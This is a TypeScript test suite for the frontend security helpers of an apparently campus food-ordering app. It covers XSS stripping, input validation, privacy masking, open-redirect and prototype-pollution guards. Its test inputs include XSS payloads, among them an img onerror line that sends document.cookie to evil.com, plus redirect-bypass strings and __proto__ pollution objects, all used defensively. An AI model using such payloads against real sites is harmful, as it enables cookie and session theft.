import {
  sanitizeText,
  sanitizeCookingNotes,
  sanitizeSearchQuery,
  sanitizePRN,
  sanitizeUTR,
  sanitizePhoneNumber,
  isSafeLink,
} from './sanitizer';
import {
  maskPhoneNumber,
  maskPRN,
  maskEmail,
  maskUTR,
} from './privacy';
import {
  isSafeInternalRedirect,
  getSafeRedirectUrl,
} from './navigation';
import {
  safeDeepClone,
  safeJsonParse,
} from './prototype-shield';

export interface SecurityTestResult {
  suite: string;
  name: string;
  passed: boolean;
  error?: string;
}

/**
 * Comprehensive Automated Verification Suite for Client-Side Security.
 */
export function runFrontendSecurityTests(): SecurityTestResult[] {
  const results: SecurityTestResult[] = [];

  function assert(suite: string, name: string, condition: boolean, errorMsg?: string) {
    results.push({
      suite,
      name,
      passed: condition,
      error: condition ? undefined : errorMsg || 'Assertion failed',
    });
  }

  // 1. XSS Tag & Script Stripping
  const xssInput1 = '<script>alert("XSS")</script>Hello Chef';
  const clean1 = sanitizeText(xssInput1);
  assert('XSS Prevention', 'Strips <script> tags completely', !clean1.includes('<script>') && !clean1.includes('alert'));

  const xssInput2 = '<img src="x" onerror="fetch(\'http://evil.com?c=\'+document.cookie)">Extra Mayo';
  const clean2 = sanitizeText(xssInput2);
  assert('XSS Prevention', 'Strips img onerror event handler', !clean2.includes('onerror') && !clean2.includes('fetch'));

  const xssInput3 = 'javascript:alert(document.domain)';
  assert('XSS Prevention', 'Rejects javascript: links', isSafeLink(xssInput3) === false);
  assert('XSS Prevention', 'Allows relative internal links', isSafeLink('/menu') === true);

  // 2. Cooking Notes Sanitization
  const rawNotes = '<script>bad()</script>Less spicy, extra green chutney! <style>body{color:red}</style>';
  const sanitizedNotes = sanitizeCookingNotes(rawNotes);
  assert('Cooking Notes', 'Sanitizes cooking notes while preserving culinary punctuation',
    sanitizedNotes === 'Less spicy, extra green chutney!'
  );

  // 3. Search Query Sanitization
  const rawSearch = 'Burger <script> (.*)+? [a-z]';
  const sanitizedSearch = sanitizeSearchQuery(rawSearch);
  assert('Search Query', 'Strips regex exploit characters and tags from search',
    !sanitizedSearch.includes('<script>') && !sanitizedSearch.includes('(')
  );

  // 4. PRN Validation & Normalization
  const validPrn1 = sanitizePRN('2023SUCS0777');
  assert('PRN Validation', 'Accepts valid alphanumeric student PRN', validPrn1.isValid && validPrn1.sanitized === '2023SUCS0777');

  const validPrn2 = sanitizePRN('  0110  ');
  assert('PRN Validation', 'Trims and accepts 4-digit student PRN', validPrn2.isValid && validPrn2.sanitized === '0110');

  const invalidPrn = sanitizePRN('<script>');
  assert('PRN Validation', 'Rejects malicious script tags as PRN', invalidPrn.isValid === false);

  // 5. UTR 12-Digit Validation
  const validUtr = sanitizeUTR('928374615243');
  assert('UTR Validation', 'Accepts exact 12-digit numeric Bank UTR', validUtr.isValid && validUtr.sanitized === '928374615243');

  const invalidUtrShort = sanitizeUTR('12345');
  assert('UTR Validation', 'Rejects short UTR (< 12 digits)', invalidUtrShort.isValid === false);

  const invalidUtrChars = sanitizeUTR('92837461524A');
  assert('UTR Validation', 'Rejects non-numeric UTR', invalidUtrChars.isValid === false);

  // 6. Phone Number Validation
  const validPhone = sanitizePhoneNumber('+91 9960091371');
  assert('Phone Validation', 'Normalizes +91 and accepts 10-digit Indian mobile', validPhone.isValid && validPhone.sanitized === '9960091371');

  const invalidPhone = sanitizePhoneNumber('1234567890');
  assert('Phone Validation', 'Rejects mobile number not starting with 6-9', invalidPhone.isValid === false);

  // 7. Privacy Masking (DPDP Compliance)
  assert('Privacy Masking', 'Masks phone number showing only last 4 digits',
    maskPhoneNumber('9960091371') === '+91 ******1371'
  );

  assert('Privacy Masking', 'Masks 12-digit PRN',
    maskPRN('2023SUCS0777') === '2023****0777'
  );

  assert('Privacy Masking', 'Masks student email address',
    maskEmail('shivam.nirmal@sanjivani.edu.in') === 's***l@sanjivani.edu.in'
  );

  assert('Privacy Masking', 'Masks 12-digit UTR',
    maskUTR('928374615243') === '9283****5243'
  );

  // 8. Open Redirect Prevention
  assert('Open Redirect', 'Rejects protocol-relative //evil.com',
    isSafeInternalRedirect('//evil.com') === false
  );

  assert('Open Redirect', 'Rejects backslash bypass /\\evil.com',
    isSafeInternalRedirect('/\\evil.com') === false
  );

  assert('Open Redirect', 'Rejects external https://phishing.com',
    isSafeInternalRedirect('https://phishing.com') === false
  );

  assert('Open Redirect', 'Allows safe internal /cart path',
    isSafeInternalRedirect('/cart') === true
  );

  assert('Open Redirect', 'Resolves safe fallback for malicious redirect parameter',
    getSafeRedirectUrl('//phishing.com', '/menu') === '/menu'
  );

  // 9. Prototype Pollution Shield
  const maliciousObject = JSON.parse('{"__proto__": {"polluted": true}, "name": "Safe Dish"}');
  const sanitizedClone = safeDeepClone(maliciousObject);
  assert('Prototype Shield', 'Strips __proto__ key during deep clone',
    !Object.prototype.hasOwnProperty.call(sanitizedClone, '__proto__') && (sanitizedClone as any).name === 'Safe Dish'
  );

  const parsedSafe = safeJsonParse('{"constructor": {"prototype": {"admin": true}}, "item": "Vada Pav"}', {});
  assert('Prototype Shield', 'Omit constructor/prototype keys during safe JSON parse',
    !Object.prototype.hasOwnProperty.call(parsedSafe, 'constructor')
  );

  return results;
}

export default runFrontendSecurityTests;

